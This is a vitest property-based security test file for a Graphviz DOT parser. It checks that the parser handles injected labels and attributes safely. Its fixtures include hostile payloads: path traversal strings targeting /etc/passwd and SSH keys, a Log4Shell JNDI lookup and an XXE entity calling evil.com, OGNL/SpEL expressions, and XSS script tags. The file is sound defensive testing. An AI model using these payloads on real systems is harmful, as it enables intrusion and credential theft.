import { parse, stringify } from '@ts-graphviz/ast';
import * as fc from 'fast-check';
import { describe, it, expect } from 'vitest';
import {
  SecurityArbitraries,
  SecurityTestPatterns,
  SecurityValidators,
  ATTACK_PATTERNS,
  DEFAULT_SECURITY_CONFIG
} from './utils/security-test-helpers.js';

/**
 * Tests specifically designed to detect vulnerabilities with malicious inputs
 */
describe('Malicious Input Security Tests', () => {
  describe('Script Injection Prevention', () => {
    it('should safely handle script-like content in labels', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('script_injection'),
          (script) => {
            const dotString = `digraph G { a [label="${script}"]; }`;
            
            try {
              const result = parse(dotString);
              expect(result).toBeDefined();
              
              // Verify that the output doesn't contain executable script content
              const serialized = stringify(result);
              expect(SecurityValidators.hasScriptInjection(serialized)).toBe(false);
              
              return true;
            } catch (error) {
              // If parsing fails, ensure it's a proper error
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle URL injection attempts', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('url_injection'),
          (url) => {
            const dotString = `digraph G { a [URL="${url}"]; }`;
            
            try {
              const result = parse(dotString);
              expect(result).toBeDefined();
              
              const serialized = stringify(result);
              expect(serialized).not.toMatch(/javascript:/i);
              expect(serialized).not.toMatch(/data:text\/html/i);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should detect and handle path traversal attempts', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('path_traversal'),
          (path) => {
            const dotString = `digraph G { a [shapefile="${path}"]; }`;
            
            try {
              const result = parse(dotString);
              expect(result).toBeDefined();
              
              const serialized = stringify(result);
              expect(SecurityValidators.hasPathTraversal(serialized)).toBe(false);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should handle command injection attempts', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('command_injection'),
          (command) => {
            const dotString = `digraph G { a [comment="${command}"]; }`;
            
            try {
              const result = parse(dotString);
              expect(result).toBeDefined();
              
              const serialized = stringify(result);
              expect(SecurityValidators.hasCommandInjection(serialized)).toBe(false);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should handle directory traversal attempts in file references', () => {
      const traversalPatterns = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '~/.ssh/id_rsa',
        '/proc/self/environ',
        '/dev/random'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...traversalPatterns), (path) => {
          const dotString = `digraph G { a [shapefile="${path}"]; }`;
          
          try {
            const result = parse(dotString);
            expect(result).toBeDefined();
            
            // Path should be parsed as string, not resolved
            const serialized = stringify(result);
            expect(serialized).toBeDefined();
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Format String Attack Prevention', () => {
    it('should handle format string specifiers safely', () => {
      const formatStrings = [
        '%s%s%s%s%s%s%s%s%s%s',
        '%x%x%x%x%x%x%x%x%x%x',
        '%n%n%n%n%n%n%n%n%n%n',
        '%08x.%08x.%08x.%08x',
        '%.2047d',
        '%*.*s',
        '${jndi:ldap://evil.com/a}',
        '%{#context["xwork.MethodAccessor.denyMethodExecution"]=false}',
        '%{T(java.lang.System).exit(1)}'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...formatStrings), (formatStr) => {
          const dotString = `digraph G { a [label="${formatStr}"]; }`;
          
          try {
            const result = parse(dotString);
            expect(result).toBeDefined();
            
            // Format strings should be treated as literal text
            const serialized = stringify(result);
            expect(serialized).toBeDefined();
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('XML/HTML Entity Injection', () => {
    it('should handle XML entities safely', () => {
      const xmlEntities = [
        '&lt;malicious&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&amp;#60;script&amp;#62;',
        '&quot;><script>alert(1)</script>',
        '&apos;><script>alert(1)</script>',
        '<!DOCTYPE html>',
        '<?xml version="1.0"?>',
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
        '<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...xmlEntities), (entity) => {
          const dotString = `digraph G { a [label="${entity}"]; }`;
          
          try {
            const result = parse(dotString);
            expect(result).toBeDefined();
            
            const serialized = stringify(result);
            expect(serialized).toBeDefined();
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Binary and Non-printable Character Handling', () => {
    it('should handle binary data safely', () => {
      fc.assert(
        fc.property(
          fc.array(fc.integer({ min: 0, max: 255 }), { minLength: 1, maxLength: 50 }),
          (bytes) => {
            try {
              // Create string with potential binary content
              const binaryString = bytes.map(b => String.fromCharCode(b)).join('');
              const dotString = `digraph G { a [label="${binaryString}"]; }`;
              
              const result = parse(dotString);
              expect(result).toBeDefined();
              
              return true;
            } catch (error) {
              // Binary content might not be valid, but shouldn't crash
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle null bytes and control characters', () => {
      const controlChars = [
        '\x00', // null byte
        '\x01', // start of heading
        '\x02', // start of text
        '\x03', // end of text
        '\x04', // end of transmission
        '\x05', // enquiry
        '\x06', // acknowledge
        '\x07', // bell
        '\x08', // backspace
        '\x0B', // vertical tab
        '\x0C', // form feed
        '\x0E', // shift out
        '\x0F', // shift in
        '\x7F'  // delete
      ];

      fc.assert(
        fc.property(fc.constantFrom(...controlChars), (controlChar) => {
          const dotString = `digraph G { a [label="test${controlChar}test"]; }`;
          
          try {
            const result = parse(dotString);
            expect(result).toBeDefined();
            
            return true;
          } catch (error) {
            // Control characters might not be valid, but shouldn't crash
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Denial of Service Prevention', () => {
    it('should handle extremely long identifiers', () => {
      fc.assert(
        fc.property(fc.integer({ min: 1000, max: 100000 }), (length) => {
          const longId = 'a'.repeat(length);
          const dotString = `digraph G { "${longId}" -> b; }`;
          
          try {
            const result = parse(dotString);
            expect(result).toBeDefined();
            return true;
          } catch (error) {
            // Extremely long IDs might legitimately fail
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 10, timeout: 5000 } // 5 second timeout to prevent hanging
      );
    });

    it('should handle recursive structure attempts', () => {
      fc.assert(
        fc.property(fc.integer({ min: 10, max: 500 }), (depth) => {
          // Create potentially recursive structure
          let dotString = 'digraph G { ';
          for (let i = 0; i < depth; i++) {
            dotString += `subgraph cluster_${i} { `;
            dotString += `node_${i} -> node_${i + 1}; `;
          }
          for (let i = 0; i < depth; i++) {
            dotString += ' }';
          }
          dotString += ' }';
          
          try {
            const result = parse(dotString);
            expect(result).toBeDefined();
            return true;
          } catch (error) {
            // Deep recursion might legitimately fail
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 20, timeout: 5000 }
      );
    });
  });
});